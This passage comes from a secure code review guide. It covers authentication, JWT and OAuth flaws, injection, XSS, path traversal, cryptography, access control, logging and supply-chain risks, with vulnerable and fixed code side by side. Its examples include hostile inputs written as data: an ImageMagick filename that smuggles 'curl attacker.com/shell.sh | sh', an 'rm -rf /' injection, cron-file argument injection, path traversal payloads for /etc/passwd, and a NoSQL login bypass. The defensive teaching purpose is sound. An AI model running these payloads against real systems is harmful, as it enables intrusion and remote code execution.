- Session ID entropy: minimum 128 bits of randomness (check CSPRNG usage)
- Session ID in cookie only (never in URL, never in localStorage for auth)
- Cookie attributes: `Secure`, `HttpOnly`, `SameSite=Lax` (or Strict)
- Session invalidation on: logout, password change, privilege change
- Idle timeout: 15-30 minutes for sensitive apps
- Absolute timeout: 8-24 hours maximum
- Session fixation prevention: regenerate ID after authentication

**Session Fixation:**

Vulnerable:
```python
@app.route('/login', methods=['POST'])
def login():
    if verify_credentials(request.form['user'], request.form['pass']):
        session['authenticated'] = True  # Session ID not regenerated!
        session['user'] = request.form['user']
        return redirect('/dashboard')
```

Fixed:
```python
@app.route('/login', methods=['POST'])
def login():
    if verify_credentials(request.form['user'], request.form['pass']):
        # Regenerate session ID before elevating privileges
        old_session_data = dict(session)
        session.clear()
        session.regenerate()  # Framework-specific: creates new session ID
        session['authenticated'] = True
        session['user'] = request.form['user']
        return redirect('/dashboard')
```

### 4.3 Multi-Factor Authentication Bypass Patterns

Review for these bypass vectors:

1. **MFA step skip:** Can the user navigate directly to the post-MFA page without completing the second factor?
```python
# Vulnerable: separate endpoints without state validation
@app.route('/verify-password', methods=['POST'])  # Step 1
@app.route('/verify-otp', methods=['POST'])        # Step 2
@app.route('/dashboard')                           # Step 3 — accessible without step 2?
```

2. **MFA status in client-controlled data:** Is MFA completion tracked in a JWT claim or cookie the client can forge?

3. **Backup code brute force:** Are backup codes rate-limited? (Typically 8 chars = 100M combinations without rate limiting)

4. **MFA enrollment bypass:** Can a user complete registration without MFA setup when MFA is mandatory?

5. **Response manipulation:** Does changing the API response from `{"mfa_required": true}` to `{"mfa_required": false}` bypass enforcement?

### 4.4 OAuth/OIDC Implementation Review Points

| Check | What to Verify |
|-------|---------------|
| State parameter | Present, unpredictable, bound to session, validated on callback |
| PKCE | code_verifier is 43-128 chars, high entropy; code_challenge uses S256 |
| Redirect URI | Exact match validation (no wildcards, no open redirect) |
| Token storage | Access tokens not in localStorage; refresh tokens in httpOnly cookies |
| Scope validation | Server enforces minimum necessary scopes |
| Token exchange | Authorization code used exactly once and expires in <60s |
| ID token validation | Signature, iss, aud, exp, nonce all verified |

**Common OAuth flaws in code:**

```python
# FLAW: Open redirect in redirect_uri
redirect_uri = request.args.get('redirect_uri')
# No validation — attacker sets redirect_uri=https://evil.com to steal auth code

# FLAW: Missing state validation
code = request.args.get('code')
token = exchange_code(code)  # No CSRF check — state parameter ignored

# FLAW: Accepting tokens from URL fragments in server-side code
access_token = request.args.get('access_token')  # Implicit flow token in URL
```

### 4.5 JWT Implementation Review

**Algorithm Confusion Attack:**

Vulnerable:
```python
import jwt

def verify_token(token):
    # Trusts the algorithm specified in the token header
    header = jwt.get_unverified_header(token)
    if header['alg'] == 'RS256':
        return jwt.decode(token, public_key, algorithms=['RS256'])
    elif header['alg'] == 'HS256':
        return jwt.decode(token, secret_key, algorithms=['HS256'])
    # Attack: Set alg=HS256, sign with the PUBLIC key (which is not secret)
    # Library treats public key as HMAC secret → forged token validates
```

Fixed:
```python
import jwt

def verify_token(token):
    # ALWAYS enforce algorithm server-side, never trust token header
    return jwt.decode(
        token,
        public_key,
        algorithms=['RS256'],  # Only accept RS256, reject all others
        options={
            'require': ['exp', 'iss', 'aud', 'sub'],
            'verify_exp': True,
            'verify_iss': True,
            'verify_aud': True,
        },
        issuer='https://auth.example.com',
        audience='https://api.example.com'
    )
```

**JWT Review Checklist:**

- [ ] Algorithm enforced server-side (not from token header)
- [ ] `alg: none` rejected
- [ ] All standard claims validated (exp, iss, aud, nbf)
- [ ] Signing key is not the same as encryption key
- [ ] Key rotation mechanism exists (JWKS with key IDs)
- [ ] Token lifetime is short (15 min for access tokens)
- [ ] Refresh token rotation (one-time use, detect reuse)
- [ ] JWTs not stored in localStorage (XSS-accessible)
- [ ] Critical claims (roles, permissions) not solely client-controlled

### 4.6 Remember-Me Token Security

Vulnerable:
```python
# Predictable remember-me token
remember_token = base64.b64encode(f"{user_id}:{timestamp}".encode())
# Attacker can forge tokens for any user
```

Fixed:
```python
import secrets
import hashlib

def create_remember_token(user_id: int) -> str:
    # Generate cryptographically random token
    raw_token = secrets.token_bytes(32)
    # Store hashed version in database (so DB leak doesn't compromise tokens)
    token_hash = hashlib.sha256(raw_token).hexdigest()
    db.store_remember_token(user_id, token_hash, expires=datetime.utcnow() + timedelta(days=30))
    # Return raw token to client (in secure cookie)
    return raw_token.hex()

def verify_remember_token(raw_token_hex: str) -> Optional[int]:
    token_hash = hashlib.sha256(bytes.fromhex(raw_token_hex)).hexdigest()
    record = db.get_remember_token(token_hash)
    if record and record.expires > datetime.utcnow():
        return record.user_id
    return None
```

---

## 5. Input Validation and Output Encoding

### 5.1 Injection Sink Identification Across Languages

Map dangerous functions by language — these are the sinks to trace backward from:

**SQL Execution:**
```
Java:     Statement.execute(), Statement.executeQuery(), prepareStatement() with concatenation
Python:   cursor.execute(), engine.execute(), raw() in Django ORM
Node.js:  connection.query(), knex.raw(), sequelize.query()
Go:       db.Query(), db.Exec() with fmt.Sprintf
PHP:      mysqli_query(), PDO::query(), pg_query()
Ruby:     ActiveRecord::Base.connection.execute(), .where("col = '#{input}'")
```

**OS Command Execution:**
```
Java:     Runtime.exec(), ProcessBuilder with unsanitized input
Python:   os.system(), subprocess with shell=True, os.popen()
Node.js:  child_process.exec(), execSync(), spawn with shell:true
Go:       exec.Command() with user-controlled arguments
PHP:      exec(), system(), passthru(), shell_exec(), popen(), proc_open()
C:        system(), popen(), execvp() with user-controlled strings
```

**Deserialization:**
```
Java:     ObjectInputStream.readObject(), XMLDecoder.readObject(), XStream.fromXML()
Python:   pickle.loads(), yaml.load(), shelve.open()
Node.js:  serialize/unserialize (node-serialize), BSON deserialization
PHP:      unserialize(), simplexml_load_string() without LIBXML_NOENT
Ruby:     Marshal.load(), YAML.load()
Go:       gob.Decode(), json.Unmarshal into interface{}
```

### 5.2 Taint Analysis Methodology

Taint analysis tracks data from untrusted sources through the program to dangerous sinks:

```
Source ──→ Propagation ──→ [Sanitizer?] ──→ Sink
  │              │                │              │
  │              │                │              └─ Dangerous function
  │              │                └─ Validation/encoding that neutralizes threat
  │              └─ Assignments, function calls, returns, collections
  └─ User input entry point (HTTP params, files, env vars, DB reads)
```

**Manual taint tracking procedure:**

1. **Identify sources** (all untrusted data entry points):
   - HTTP request parameters, headers, body, cookies
   - File uploads and file system reads
   - Database reads (previously stored user input)
   - Environment variables (in multi-tenant scenarios)
   - Inter-service communication payloads
   - WebSocket messages, message queue payloads

2. **Trace propagation** (follow the data):
   - Variable assignments
   - Function arguments and return values
   - Object property assignments
   - Collection insertions (arrays, maps, lists)
   - String concatenation and template interpolation

3. **Identify sanitizers** (transformations that neutralize threats):
   - Input validation (regex, allowlist, type checking)
   - Output encoding (HTML entity encoding, URL encoding)
   - Parameterized queries (SQL injection neutralizer)
   - Framework auto-escaping (template engines)

4. **Verify sink protection:**
   - Is there a sanitizer on EVERY path from source to sink?
   - Is the sanitizer appropriate for the context? (HTML encoding doesn't prevent SQL injection)
   - Can the sanitizer be bypassed? (Double encoding, charset tricks)

### 5.3 SQL Injection Patterns Beyond Basic Concatenation

**ORM Injection (Django):**

Vulnerable:
```python
# Django raw query — obvious
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")

# Django .extra() — less obvious
User.objects.extra(where=[f"name = '{name}'"])

# Django annotate with RawSQL
from django.db.models.expressions import RawSQL
User.objects.annotate(custom=RawSQL(f"field = {user_val}", []))  # Missing parameterization
```

**Stored Procedure Injection:**

```sql
-- The stored procedure itself may be safe:
CREATE PROCEDURE GetUser(@name NVARCHAR(100))
AS
    EXEC('SELECT * FROM users WHERE name = ''' + @name + '''')
-- Dynamic SQL inside the procedure reintroduces injection
```

**Second-Order SQL Injection:**

```python
# Step 1: User registers with malicious username (stored safely via parameterized query)
username = "admin'--"
db.execute("INSERT INTO users (name) VALUES (%s)", [username])

# Step 2: Later code reads the username and uses it unsafely
user = db.fetchone("SELECT name FROM users WHERE id = %s", [user_id])
# Step 3: The stored value is used in a new query without parameterization
db.execute(f"SELECT * FROM orders WHERE customer = '{user['name']}'")
# Result: SELECT * FROM orders WHERE customer = 'admin'--'
```

**JSON/NoSQL Injection (MongoDB):**

Vulnerable:
```javascript
// Express.js with MongoDB
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
  });
  // Attack: POST {"username": "admin", "password": {"$ne": ""}}
  // Query becomes: {username: "admin", password: {$ne: ""}} → always matches
});
```

Fixed:
```javascript
app.post('/login', async (req, res) => {
  const username = String(req.body.username); // Force string type
  const password = String(req.body.password);

  const user = await db.collection('users').findOne({
    username: username,
    // Never compare raw password; use hashed comparison
  });

  if (user && await bcrypt.compare(password, user.passwordHash)) {
    // authenticated
  }
});
```

### 5.4 XSS Contexts and Appropriate Encoding

Different DOM contexts require different encoding:

| Context | Example | Required Encoding |
|---------|---------|-------------------|
| HTML Body | `<p>USER_DATA</p>` | HTML entity encoding (`<` → `&lt;`) |
| HTML Attribute | `<input value="USER_DATA">` | Attribute encoding (quote + entity) |
| JavaScript | `<script>var x = 'USER_DATA';</script>` | JavaScript encoding (`\xHH`) |
| URL | `<a href="https://example.com?q=USER_DATA">` | URL/percent encoding |
| CSS | `<div style="color: USER_DATA">` | CSS hex encoding |
| HTML Comment | `<!-- USER_DATA -->` | Strip or reject (no safe encoding) |

**Context-specific encoding examples:**

```java
// HTML Body context
String safe = ESAPI.encoder().encodeForHTML(userInput);

// HTML Attribute context
String safe = ESAPI.encoder().encodeForHTMLAttribute(userInput);

// JavaScript context
String safe = ESAPI.encoder().encodeForJavaScript(userInput);

// URL parameter context
String safe = ESAPI.encoder().encodeForURL(userInput);
```

**DOM-Based XSS Review:**

Look for patterns where user input reaches dangerous DOM manipulation functions:

```javascript
// Dangerous sinks in DOM context:
element.innerHTML = userInput;           // XSS
document.write(userInput);               // XSS
element.setAttribute('onclick', userInput); // XSS
location.href = userInput;               // Open redirect / javascript: XSS
eval(userInput);                         // Code execution
setTimeout(userInput, 0);               // Code execution (string argument)
```

### 5.5 Command Injection in Various Contexts

**Beyond basic shell injection:**

```python
# Git command injection
repo_url = user_input  # "https://example.com; rm -rf /"
subprocess.run(["git", "clone", repo_url])  # Safe: no shell interpretation

# But if constructing git commands differently:
subprocess.run(f"git clone {repo_url}", shell=True)  # VULNERABLE

# Argument injection (no shell, but still dangerous):
filename = user_input  # "--output=/etc/cron.d/backdoor"
subprocess.run(["tar", "xf", "archive.tar", filename])  # Argument injection
# Fix: use -- to separate options from arguments
subprocess.run(["tar", "xf", "archive.tar", "--", filename])
```

**ImageMagick/FFmpeg command injection:**

```python
# ImageMagick delegate injection via filename
filename = user_input  # "image.png; curl attacker.com/shell.sh | sh"
subprocess.run(["convert", filename, "output.png"])  # May execute via delegates

# Fix: validate filetype, use policy.xml to disable dangerous delegates
```

### 5.6 Path Traversal Canonicalization Issues

```python
# Bypass attempts that naive sanitization misses:
traversal_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\etc\\passwd",        # Windows separators
    "....//....//....//etc/passwd",    # Double encoding after strip
    "%2e%2e%2f%2e%2e%2f",             # URL encoded
    "..%252f..%252f",                  # Double URL encoded
    "..%c0%af..%c0%af",               # UTF-8 overlong encoding
    "....//",                          # After replacing ../ once, still ../
]

# Correct canonicalization approach:
import os

def safe_file_access(base_dir: str, user_path: str) -> str:
    # Resolve BOTH paths to absolute canonical form
    base = os.path.realpath(base_dir)
    requested = os.path.realpath(os.path.join(base_dir, user_path))
    # Verify the resolved path is within the allowed directory
    if not requested.startswith(base + os.sep) and requested != base:
        raise PermissionError(f"Path traversal blocked: {user_path}")
    if not os.path.isfile(requested):
        raise FileNotFoundError(f"File not found: {user_path}")
    return requested
```

---

## 6. Cryptographic Implementation Review

### 6.1 Key Management Review

**Generation:**
- Verify CSPRNG usage (not `Math.random()`, `rand()`, `time()` seeded)
- RSA keys: minimum 2048 bits (prefer 3072+ for new systems)
- ECC keys: minimum 256 bits (P-256, X25519)
- Symmetric keys: minimum 128 bits (prefer 256 for AES)
- Key derivation from passwords: argon2id, not raw hash

**Storage:**
```python
# RED FLAGS in code review:
api_key = "sk-live-abc123..."  # Hardcoded in source
key = open("key.pem").read()   # Unprotected file on disk
key = os.environ["SECRET_KEY"] # Better, but verify env isolation

# ACCEPTABLE patterns:
key = vault_client.read_secret("db/encryption-key")  # Secret manager
key = kms.decrypt(encrypted_key_blob)                  # KMS envelope encryption
```

**Rotation:**
- Does the system support key rotation without downtime?
- Are old keys retained for decryption of existing data?
- Is there a key version identifier in ciphertext?
- Does rotation invalidate cached decryptions?

**Destruction:**
- Keys zeroed from memory after use (not just dereferenced for GC)
- Secure erase of key material from disk
- Key revocation propagated to all consuming services

### 6.2 Random Number Generation

| Language | CSPRNG | INSECURE (Never for crypto) |
|----------|--------|----------------------------|
| Java | `SecureRandom` | `Random`, `Math.random()` |
| Python | `secrets`, `os.urandom` | `random` module |
| Node.js | `crypto.randomBytes()` | `Math.random()` |
| Go | `crypto/rand` | `math/rand` |
| C | `/dev/urandom`, `getrandom()` | `rand()`, `srand(time(NULL))` |
| PHP | `random_bytes()`, `random_int()` | `rand()`, `mt_rand()`, `uniqid()` |
| Ruby | `SecureRandom` | `rand()` |

**Code review pattern to flag:**

```python
# Generating session tokens with insecure random
import random
session_id = ''.join(random.choices('abcdef0123456789', k=32))
# Predictable! random module uses Mersenne Twister (MT19937), deterministic after 624 outputs

# Fixed:
import secrets
session_id = secrets.token_hex(32)  # 256 bits from /dev/urandom
```

### 6.3 Cipher Mode Selection

| Mode | Use Case | Properties | Pitfalls |
|------|----------|------------|----------|
| ECB | NEVER | Deterministic, reveals patterns | Penguin problem |
| CBC | Legacy (avoid for new) | Requires random IV, sequential | Padding oracle if MAC-then-encrypt |
| CTR | Stream encryption | Parallelizable, no padding | IV/nonce reuse = catastrophic |
| GCM | Default choice (AES) | AEAD (encrypt + authenticate) | Nonce reuse = key recovery, max 2^32 blocks per key |
| ChaCha20-Poly1305 | Alternative AEAD | Software-friendly, constant time | 96-bit nonce (same reuse concern) |
| XChaCha20-Poly1305 | Extended nonce AEAD | 192-bit nonce (safe random generation) | Less hardware acceleration |

**Review red flags:**

```java
// ECB mode — pattern leaking, never acceptable
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// CBC without HMAC — vulnerable to padding oracle
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
// Must verify: is there a MAC check BEFORE decryption?

// Static/zero IV
byte[] iv = new byte[16]; // All zeros — IV reuse!
cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));

// Reused nonce in GCM (catastrophic — reveals authentication key)
```

**Correct AES-GCM usage:**

```java
// Generate random 96-bit nonce for each encryption operation
byte[] nonce = new byte[12];
SecureRandom.getInstanceStrong().nextBytes(nonce);

Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
GCMParameterSpec spec = new GCMParameterSpec(128, nonce); // 128-bit auth tag
cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec);
cipher.updateAAD(associatedData); // Authenticate additional context

byte[] ciphertext = cipher.doFinal(plaintext);
// Store: nonce || ciphertext (nonce is not secret, but must be unique)
```

### 6.4 Hash Function Usage Review

| Purpose | Acceptable | Unacceptable |
|---------|-----------|--------------|
| Password hashing | argon2id, bcrypt, scrypt | MD5, SHA-*, raw PBKDF2 with low iterations |
| Data integrity | SHA-256, SHA-3, BLAKE3 | MD5, SHA-1 (collision-vulnerable) |
| Digital signatures | SHA-256+ with RSA/ECDSA | MD5, SHA-1 |
| HMAC | HMAC-SHA256, HMAC-SHA3 | Custom MAC constructions |
| Content addressing | SHA-256, BLAKE3 | CRC32, Adler32 |
| Non-crypto dedup | xxHash, FNV | (acceptable for non-security use) |

**Common mistakes to flag:**

```python
# Using SHA-256 for password hashing (no salt, no work factor)
password_hash = hashlib.sha256(password.encode()).hexdigest()  # WRONG

# MD5 for anything security-relevant
checksum = hashlib.md5(file_content).hexdigest()  # WRONG for integrity verification

# HMAC with wrong key derivation
hmac_key = hashlib.sha256(password.encode()).digest()  # Derived from password without KDF
mac = hmac.new(hmac_key, message, hashlib.sha256)      # Key is weak
```

### 6.5 TLS Configuration Review

**Minimum requirements (2024+):**

```
Protocol: TLS 1.2 minimum, prefer TLS 1.3
Cipher suites (TLS 1.2):
  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
  - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
  - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
  - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256

Banned:
  - SSLv3, TLS 1.0, TLS 1.1
  - RC4, DES, 3DES
  - Export ciphers
  - NULL ciphers
  - MD5 MACs
  - Static RSA key exchange (no forward secrecy)
```

**Code review points:**

```python
# Disabling certificate verification — always a critical finding
requests.get(url, verify=False)  # CRITICAL: disables TLS verification

# Outdated protocol versions
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)  # TLS 1.0 is deprecated

# Missing hostname verification
ssl_context.check_hostname = False  # Allows MITM

# Correct configuration:
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
ssl_context.check_hostname = True
ssl_context.verify_mode = ssl.CERT_REQUIRED
```

### 6.6 Common Cryptographic Mistakes

**Timing-safe comparison:**

Vulnerable:
```python
def verify_mac(received_mac, computed_mac):
    return received_mac == computed_mac  # Short-circuits on first mismatch
    # Attacker can determine correct MAC byte-by-byte via timing
```

Fixed:
```python
import hmac

def verify_mac(received_mac, computed_mac):
    return hmac.compare_digest(received_mac, computed_mac)  # Constant-time
```

**IV/Nonce Reuse:**

```python
# GCM nonce reuse = authentication key recovery + plaintext XOR
# If encrypt(nonce, key, msg1) and encrypt(nonce, key, msg2) use same nonce:
# Attacker recovers: msg1 XOR msg2, and the GCM authentication subkey

# Prevention: use a counter-based nonce, or XChaCha20 with random 192-bit nonce
```

**Padding Oracle:**

When reviewing CBC implementations:
1. Is the MAC verified BEFORE decryption? (Encrypt-then-MAC is correct)
2. Does decryption failure reveal whether the error was padding or MAC?
3. Are error messages/timing different for padding vs authentication failure?

```python
# VULNERABLE pattern: MAC-then-Encrypt (verify after decrypt)
plaintext = aes_cbc_decrypt(ciphertext, key, iv)
if not verify_hmac(plaintext):
    raise AuthenticationError  # Attacker knows padding was valid

# CORRECT pattern: Encrypt-then-MAC (verify before decrypt)
if not verify_hmac(ciphertext):
    raise AuthenticationError  # Reject before decryption
plaintext = aes_cbc_decrypt(ciphertext, key, iv)
```

---

## 7. Access Control and Authorization Review

### 7.1 RBAC/ABAC Implementation Patterns and Flaws

**RBAC (Role-Based Access Control) review:**

```python
# Common RBAC flaw: role check at controller but not at service layer
@app.route('/admin/users')
@require_role('admin')  # Decorator checks role
def list_users():
    return user_service.list_all()  # But what if service is called from elsewhere?

# Another route accidentally exposes the same service without role check
@app.route('/api/v2/users')
def api_list_users():
    return user_service.list_all()  # Missing authorization — same data, no check
```

**ABAC (Attribute-Based Access Control) review:**

```python
# ABAC policy evaluation — verify all attributes are server-controlled
def can_access_document(user, document, action):
    policy = Policy(
        subject={"role": user.role, "department": user.department},
        resource={"classification": document.classification, "owner": document.owner_id},
        action=action,
        environment={"time": datetime.utcnow(), "ip": request.remote_addr}
    )
    return policy_engine.evaluate(policy)

# Flaw to review: Are any attributes coming from the client?
# If user.department is from a JWT claim without server verification → bypass
```

**Hierarchy bypass:**

```python
# Role hierarchy: super_admin > admin > moderator > user
# Flaw: checking only for exact role instead of hierarchy
if user.role == 'admin':  # super_admin is denied!
    grant_access()

# Correct: check role level
if user.role_level >= ROLE_LEVELS['admin']:
    grant_access()
```

### 7.2 Privilege Escalation Through Logic Flaws

**Horizontal privilege escalation:**

```python
# User can access other users' data by changing the ID parameter
@app.route('/api/profile/<int:user_id>')
@login_required
def get_profile(user_id):
    return db.get_user_profile(user_id)  # No check: user_id == current_user.id
```

**Vertical privilege escalation via mass assignment:**

```python
# Django model update without field restriction
@app.route('/api/profile', methods=['PATCH'])
@login_required
def update_profile():
    data = request.get_json()
    User.objects.filter(id=current_user.id).update(**data)
    # Attack: {"is_admin": true, "role": "superuser"}
    # Fix: explicitly allowlist updateable fields
```

**Race condition in authorization:**

```python
# TOCTOU: check balance, then deduct — race window between check and deduction
def transfer(sender_id, recipient_id, amount):
    sender = db.get_user(sender_id)
    if sender.balance >= amount:  # Check
        # Race window: another thread can pass this check simultaneously
        db.execute("UPDATE accounts SET balance = balance - %s WHERE id = %s", [amount, sender_id])
        db.execute("UPDATE accounts SET balance = balance + %s WHERE id = %s", [amount, recipient_id])
    # Fix: use SELECT FOR UPDATE or database-level constraints
```

### 7.3 Insecure Direct Object References (IDOR)

**Pattern recognition:**

```python
# IDOR patterns to flag during review:

# Sequential integer IDs in URLs
GET /api/invoices/1001          # Change to 1002 → access other user's invoice

# Predictable reference in request body
POST /api/download {"file_id": "report_2024_q1.pdf"}  # Change filename

# Composite key manipulation
GET /api/org/5/users/3/docs/12  # Belongs to org 5? Verified?
```

**Verification pattern:**

```python
@app.route('/api/documents/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get_or_404(doc_id)
    # MUST verify ownership or access permission
    if not current_user.can_access(doc):
        abort(403)
    return jsonify(doc.to_dict())

# Alternative: scope queries to authorized objects
@app.route('/api/documents/<int:doc_id>')
@login_required
def get_document(doc_id):
    # Query automatically scoped — user can only access their own
    doc = Document.query.filter_by(
        id=doc_id,
        owner_id=current_user.id
    ).first_or_404()
    return jsonify(doc.to_dict())
```

### 7.4 Multi-Tenant Isolation Review

**Critical review points:**

1. **Query scoping:** Every database query MUST include the tenant filter
```python
# FLAW: missing tenant filter
items = Item.query.filter_by(id=item_id).first()

# CORRECT: always scope to tenant
items = Item.query.filter_by(id=item_id, tenant_id=current_tenant.id).first()

# BEST: use a query scope that's impossible to forget
class TenantScopedQuery:
    def get_queryset(self):
        return super().get_queryset().filter(tenant_id=g.current_tenant_id)
```

2. **Storage isolation:** Are file paths, S3 prefixes, cache keys scoped to tenant?
3. **Background jobs:** Do async workers preserve and enforce tenant context?
4. **Shared resources:** Are rate limits, queues, and pools per-tenant?
5. **Admin endpoints:** Can admin actions leak cross-tenant data?
6. **Logging:** Do log entries include tenant context? Can log search cross boundaries?

### 7.5 API Authorization Middleware Review

```python
# Review middleware ordering — auth must come before business logic
app = Flask(__name__)

@app.before_request
def authenticate():
    """Runs BEFORE every request handler."""
    token = request.headers.get('Authorization', '').removeprefix('Bearer ')
    if not token:
        abort(401)
    try:
        g.current_user = verify_jwt(token)
    except InvalidTokenError:
        abort(401)

@app.before_request
def authorize():
    """Must run AFTER authenticate."""
    required_permission = get_route_permission(request.endpoint)
    if required_permission and not g.current_user.has_permission(required_permission):
        abort(403)
```

**Middleware bypass patterns to check:**

- Can OPTIONS/HEAD requests bypass auth middleware? (CORS preflight mishandling)
- Are static file routes excluded from auth? (If static files include sensitive content)
- Does path normalization differ between router and middleware? (`/api/admin` vs `/api/admin/` vs `/API/Admin`)
- Are websocket connections checked? (HTTP upgrade may bypass HTTP middleware)

### 7.6 Default-Deny vs Default-Allow Identification

**Default-Allow (DANGEROUS):**

```python
# Blocklist approach — anything not explicitly blocked is allowed
BLOCKED_ROUTES = ['/admin', '/internal']

def check_access(path):
    if path in BLOCKED_ROUTES:
        require_auth()
    # Everything else is open — new routes are unprotected by default
```

**Default-Deny (CORRECT):**

```python
# Allowlist approach — anything not explicitly allowed is denied
PUBLIC_ROUTES = ['/login', '/health', '/static']

def check_access(path):
    if path not in PUBLIC_ROUTES:
        require_auth()  # Everything is protected by default
    # New routes are automatically protected
```

Review signal: If adding a new route requires NO security configuration, the system is likely default-allow. A secure system requires explicit permission grants for new endpoints.

---

## 8. Data Flow and Architecture Review

### 8.1 Sensitive Data Identification

**Classification tiers:**

| Tier | Data Types | Handling Requirements |
|------|-----------|----------------------|
| Critical | Passwords, private keys, card numbers | Encrypted at rest, never logged, memory-zeroed |
| High | PII (SSN, health records, biometrics) | Encrypted, access-controlled, audit-logged |
| Medium | Email, phone, address, preferences | Access-controlled, consent-managed |
| Low | Public content, aggregated metrics | Standard access controls |

**Review for data exposure:**

```python
# Search patterns in code review:
# 1. What gets serialized to responses?
return jsonify(user.__dict__)  # Exposes ALL fields including password_hash, internal IDs

# 2. What gets logged?
logger.info(f"Login attempt: user={username}, password={password}")  # Credentials in logs!
logger.info(f"Payment: card={card_number}, amount={amount}")  # PCI violation

# 3. What gets cached?
cache.set(f"user:{user_id}", json.dumps(user.to_dict()))  # Includes sensitive fields?

# 4. What goes to analytics/APM?
track_event("purchase", {"user": user.email, "card_last4": card[-4:]})
```

### 8.2 Data-at-Rest Encryption Verification

**Review checklist:**

- Database columns containing sensitive data: are they encrypted (application-level or TDE)?
- File storage: are sensitive files encrypted before upload?
- Backups: are they encrypted with a separate key from production?
- Search indexes: do they contain cleartext copies of encrypted fields?
- Temporary files: are they on encrypted filesystem? Securely deleted after use?
- Cache layers: does Redis/Memcached store cleartext versions of encrypted DB data?

```python
# Application-level field encryption pattern to verify
from cryptography.fernet import Fernet

class EncryptedField:
    def __init__(self, key_id: str):
        self.key_id = key_id

    def encrypt(self, plaintext: str) -> str:
        key = key_manager.get_key(self.key_id)
        f = Fernet(key)
        return f.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext: str) -> str:
        key = key_manager.get_key(self.key_id)
        f = Fernet(key)
        return f.decrypt(ciphertext.encode()).decode()

# Verify: is the key_manager using KMS? Is key rotation supported?
# Verify: is the encrypted value searchable without decryption (if needed)?
```

### 8.3 Logging Review

**What MUST be logged (for security monitoring):**
- Authentication successes and failures (with source IP, user agent)
- Authorization failures (access denied events)
- Input validation failures (potential attack indicators)
- System errors affecting security controls
- Administrative actions (user creation, permission changes)
- Data exports and bulk access

**What MUST NOT be logged:**
- Passwords, tokens, API keys, session IDs
- Credit card numbers, CVV, bank account numbers
- Social security numbers, health records
- Full request/response bodies containing PII
- Cryptographic keys or key material

```python
# Dangerous logging patterns:
logger.debug(f"Request headers: {dict(request.headers)}")  # Leaks Authorization header
logger.info(f"User {user_id} token refreshed: {new_token}")  # Token in logs
logger.error(f"DB connection failed: {connection_string}")  # Credentials in conn string

# Safe patterns:
logger.info("auth.login.success", extra={"user_id": user_id, "ip": request.remote_addr})
logger.warning("auth.login.failure", extra={"username": username[:3] + "***", "ip": ip})
logger.error("db.connection.failed", extra={"host": db_host, "port": db_port})
```

### 8.4 Error Handling Review

**Information disclosure through errors:**

Vulnerable:
```python
@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": str(e),
        "traceback": traceback.format_exc(),  # Stack trace to client
        "query": str(e.__cause__),             # SQL query in error
        "debug_info": {
            "db_host": app.config['DB_HOST'],  # Internal infrastructure
            "version": app.config['VERSION']    # Software version
        }
    }), 500
```

Fixed:
```python
@app.errorhandler(Exception)
def handle_error(e):
    # Generate a correlation ID for support
    error_id = str(uuid4())
    # Log full details server-side
    logger.exception(f"Unhandled exception [{error_id}]", exc_info=e)
    # Return generic message to client
    return jsonify({
        "error": "An internal error occurred",
        "error_id": error_id,
        "support": "Contact support with this error_id for assistance"
    }), 500
```

**Framework-specific error review:**

- Django: Is `DEBUG = True` in production? (`settings.py`)
- Spring Boot: Is `server.error.include-stacktrace=always`?
- Express: Is the default error handler showing stack traces?
- .NET: Is `<customErrors mode="Off"/>` in production web.config?

### 8.5 Third-Party Library Risk Assessment

**Review framework:**

```bash
# 1. Known vulnerability check
npm audit --production
pip-audit --strict
mvn dependency-check:check

# 2. Maintenance assessment
# Check: last commit date, open issues ratio, bus factor (single maintainer?)
# Red flag: no release in 2+ years, 100+ open security issues, no response to CVE reports

# 3. Supply chain indicators
# Verify: package name squatting (lodash vs lodas vs l0dash)
# Verify: maintainer account takeover (sudden change in maintainer)
# Verify: source matches published artifact (reproducible builds)
```

**Dependency policy review:**

| Risk Factor | Threshold | Action |
|-------------|-----------|--------|
| CVSS ≥ 9.0 | Immediate | Block build, patch within 24h |
| CVSS 7.0-8.9 | High | Patch within 7 days |
| CVSS 4.0-6.9 | Medium | Patch within 30 days |
| Unmaintained (2+ years) | — | Plan migration, document risk acceptance |
| No security policy | — | Evaluate alternatives |
| Excessive permissions | — | Review and potentially fork |

### 8.6 Dependency Confusion and Supply Chain Review

**Dependency confusion vectors:**

```
Internal package name: @company/utils (on private registry)
Attack: Publish "company-utils" or "@company/utils" on public npm with higher version

# package.json — vulnerable if registry resolution is misconfigured
{
  "dependencies": {
    "@company/utils": "^2.0.0"  // Could resolve to public registry
  }
}
```

**Review mitigations:**

```bash
# .npmrc — enforce scoped registry
@company:registry=https://company.jfrog.io/artifactory/api/npm/npm-local/
registry=https://registry.npmjs.org/

# pip.conf — prevent public fallback for internal packages
[global]
index-url = https://company.jfrog.io/simple/
extra-index-url =  # Intentionally empty — no fallback to PyPI for internal
```

**Build pipeline review:**

- Are build scripts running with minimal permissions?
- Can a dependency's `postinstall` script exfiltrate CI secrets?
- Are lockfiles committed and verified in CI (integrity hashes)?
- Are there runtime dependency downloads (fetching code at runtime)?

---

## 9. CI/CD Integration

### 9.1 Pre-Commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: package-lock\.json|\.secrets\.baseline

